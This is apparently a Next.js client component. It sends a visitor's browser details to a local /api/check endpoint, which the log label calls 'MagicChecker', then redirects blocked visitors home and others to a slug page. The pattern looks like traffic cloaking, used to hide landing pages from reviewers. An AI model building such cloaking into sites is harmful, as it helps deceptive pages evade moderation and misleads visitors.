"use client";

import { useEffect } from "react";

export default function ClientChecker({ slug }: { slug: string }) {

	useEffect(() => {
		async function runCheck() {
			const headers = {

				REMOTE_ADDR: window.location.hostname,
				REMOTE_PORT: window.location.port || "80",
				HTTP_USER_AGENT: navigator.userAgent,
				HTTP_ACCEPT: navigator.language,
				HTTP_ACCEPT_LANGUAGE: navigator.language,
				HTTP_REFERER: document.referrer,
				REQUEST_URI: window.location.pathname,
				QUERY_STRING: window.location.search.slice(1),
				SERVER_PROTOCOL: "HTTP/1.1",
			};

			try {
				const res = await fetch("/api/check", {
					method: "POST",
					headers: { "Content-Type": "application/json" },
					body: JSON.stringify(headers),
				});

				const result = await res.json();
				console.log("MagicChecker result:", result);

				if (result.isBlocked === 1) {
					window.location.href = "/";
				} else if (result.success === 1 && result.urlType === "redirect") {
					window.location.href = slug;
				}
				// else if (result.success === 1 && result.url) {
				//   window.location.href = "/" + result.url;
				// }
			} catch (err) {
				console.error("Check failed:", err);
			}
		}

		runCheck();
	}, []);

	return <h2 className="text-center text-lg ">Wait a moment...</h2>;
}
